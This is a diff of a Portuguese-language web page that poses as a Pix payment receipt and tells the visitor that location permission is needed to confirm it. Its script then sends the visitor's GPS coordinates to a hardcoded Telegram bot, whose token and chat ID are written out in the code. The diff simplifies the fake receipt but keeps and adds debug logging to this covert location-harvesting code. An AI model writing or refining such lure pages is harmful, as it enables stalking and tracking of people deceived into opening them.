@@ -1,106 +1,18 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      padding: 20px;
-      color: #333;
-    }
-
-    .comprovante-container {
-      background-color: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      width: 80%;
-      margin: 0 auto;
-    }
-
-    h1 {
-      text-align: center;
-      color: #1c74d5;
-    }
-
-    .informacoes {
-      margin-top: 20px;
-      font-size: 16px;
-    }
-
-    .informacoes p {
-      margin: 10px 0;
-    }
-
-    .informacoes span {
-      font-weight: bold;
-    }
-
-    .botao {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 20px;
-    }
-
-    .botao:hover {
-      background-color: #218838;
-    }
-
-    .comprovante-footer {
-      text-align: center;
-      margin-top: 30px;
-      font-size: 14px;
-    }
-
-    .comprovante-footer a {
-      color: #1c74d5;
-      text-decoration: none;
-    }
-  </style>
+  <title>Comprovante de Pix</title>
 </head>
-
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+  <h1>Comprovante de Pix Recebido</h1>
+  <img src="comprovante.png" alt="Comprovante de Pix" width="300">
+  <p>Para confirmar, precisamos da sua localização. Por favor, permita a permissão de localização.</p>
 
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
-    </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
-    <button class="botao" onclick="getLocation()">Enviar Localização</button>
-  </div>
+  <button onclick="getLocation()">Obter Localização</button>
 
   <script>
-    // Preencher data atual
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    // Função para obter a localização
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
@@ -109,24 +21,27 @@
       }
     }
 
-    // Enviar localização para o Telegram
     function sendLocation(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-
-      // Substitua pelos seus dados reais (não deixe visível em um repositório público)
-      const telegramBotToken = "7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY"; // Seu token do bot
-      const chatId = "6045619916"; // Seu chat ID (ID do usuário ou grupo do Telegram)
-
+      
+      // Token do bot e chat ID fornecidos
+      const telegramBotToken = "7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY";  // Seu token do bot
+      const chatId = "6045619916";  // Seu chat ID (ID do usuário ou grupo do Telegram)
+      
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
-
+      
+      // Log da URL para depuração
+      console.log("URL para enviar localização:", url);
+      
       fetch(url)
         .then(response => response.json())
         .then(data => {
+          console.log("Resposta da API do Telegram:", data);  // Log para ver o retorno da API
           if (data.ok) {
             alert("Localização enviada com sucesso!");
           } else {
-            alert("Erro ao enviar localização: " + JSON.stringify(data));
+            alert("Erro ao enviar localização. Detalhes: " + JSON.stringify(data));
           }
         })
         .catch(error => {
@@ -134,7 +49,6 @@
         });
     }
 
-    // Mostrar erro caso a localização não seja obtida
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
@@ -153,5 +67,4 @@
     }
   </script>
 </body>
-
 </html>
